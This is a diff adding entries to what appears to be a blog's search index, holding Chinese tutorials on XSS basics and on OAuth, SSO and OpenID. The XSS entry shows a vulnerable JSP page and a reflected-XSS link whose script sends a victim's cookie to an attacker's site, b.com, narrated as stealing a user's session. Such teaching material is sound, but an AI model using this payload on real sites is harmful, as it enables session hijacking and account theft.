@@ -221,6 +221,30 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[Web安全—XSS触发、绕过、盗取Cookie]]></title>
+    <url>%2F2018%2F07%2F09%2FWeb%E5%AE%89%E5%85%A8%E2%80%94XSS%E8%A7%A6%E5%8F%91%E3%80%81%E7%BB%95%E8%BF%87%E3%80%81%E7%9B%97%E5%8F%96Cookie%2F</url>
+    <content type="text"></content>
+      <categories>
+        <category>WEB安全</category>
+        <category>Browser端安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Web安全—XSS基础]]></title>
+    <url>%2F2018%2F07%2F08%2FWeb%E5%AE%89%E5%85%A8%E2%80%94XSS%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;lt;body&gt;或&amp;lt;frameset&gt;每次出现时被自动创建 open()方法用于打开一个新的浏览器窗口或查找一个已命名的窗口 （三）document.password.pass.value 123document是javascript里面的文档对象，里面含有很多的属性和方法，而value值就是属性。在这里是获得password.password.pass.value的值。 （四）javascript alert() 12警示对话框 函数括号内的文本信息显示在对话框中，把它称为警示对话框，要显示的信息放置在括号内，该对画框包含一个确认"确认"按钮。用户阅读完之后所显示的信息后，只需要点击该按钮就可以关闭对话框，在这里就是一个弹出框。 二、XSS定义 跨站脚本攻击(Cross Site Scripting)，缩写为XSS。 恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML 攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容 三、 XSS的原理 攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码） 诱使受害者打开受到攻击的服务器URL 受害者在Web浏览器中打开URL，恶意脚本执行 四、XSS的攻击方式（一）反射型 DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。 发送请求时，XSS代码出现在URL中(反射型的典型特征)，作为输入提交到服务器端，服务器端解析后响应(search中包含XSS代码，可以是js或者HTML或者CSS)，XSS代码随着响应内容一起传回浏览器，最后浏览器解析执行XSS代码，这个过程像一个反射，所以叫做反射型XSS。 注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的而称为非持久型XSS，则是因为这种攻击方式具有一次性。 场景一 当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： 12345678910&lt;%@ page language="java"contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;XSS测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;页面内容：&lt;%=request.getParameter("content")%&gt;&lt;/body&gt;&lt;/html&gt; 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为 1http://www.a.com?content=&lt;script&gt; window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt; 当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！ 这个过程中， 受害者只有Tom自己。那当我在浏览器输入a.com?content=alert(“xss”)]]></content>
+      <categories>
+        <category>WEB安全</category>
+        <category>Browser端安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Web认证授权4—OAuth、SSO、OpenID.md]]></title>
     <url>%2F2018%2F07%2F07%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%834%E2%80%94OAuth%E3%80%81%20SSO%E3%80%81OpenID%2F</url>
     <content type="text"><![CDATA[一、OAuth OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。 （一）原理 思路：OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”登录授权层，在授权层拿到Token（Token携带权限范围和时间等），再去访问目标网站 OAuth允许用户提供一个令牌（Token），而不是用户名和密码来访问他们存放在特定服务提供者的数据。 每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。 这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容 （二）四种授权模式123456789101112授权码模式（authorization code）：功能最完整、流程最严密的授权模式。也是最常用的授权模式。其通过客户端的后台服务器，与"服务提供商"的认证服务器进行互动。简化模式（implicit）：不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。密码模式（resource owner password credentials）：用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。客户端模式（client credentials）：指客户端以自己的名义，而不是以用户的名义，向"服务提供商"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务，其实不存在授权问题。 （三）安全性问题：关注四个参数1234567redirect_url:回调域名client:必须与域名绑定state:防止CSRFscope:权限范围 二、SSO：单点登录 在多个应用系统中，用户只需登陆一次，就可以访问所有相互信任的应用。 通常公司内部会有非常多的工具平台供大家使用，比如人力资源，代码管理，日志监控，预算申请等等。如果每一个平台都实现自己的用户体系的话无疑是巨大的浪费，所以公司内部会有一套公用的用户体系，用户只要登陆之后，就能够访问所有的系统。 SSO 是一类解决方案的统称，而在具体的实施方面，有两种策略可供选择： SAML 2.0 OAuth 2.0 三、OpenID 某些站点看到允许以 OpenID 的方式登陆，其实也就是以 Facebook 账号或者 Google 账号登陆站点 这听上去似乎和 OAuth 很像。但本质上来说它们是截然不同用户的两个东西： OpenID 只用于身份认证（Authentication），允许你以同一个账户在多个网站登陆。它仅仅是为你的合法身份背书，当你以 Facebook 账号登陆某个站点之后，该站点无权访问你的在 Facebook 上的数据 OAuth 用于授权（Authorisation），允许被授权方访问授权方的用户数据]]></content>
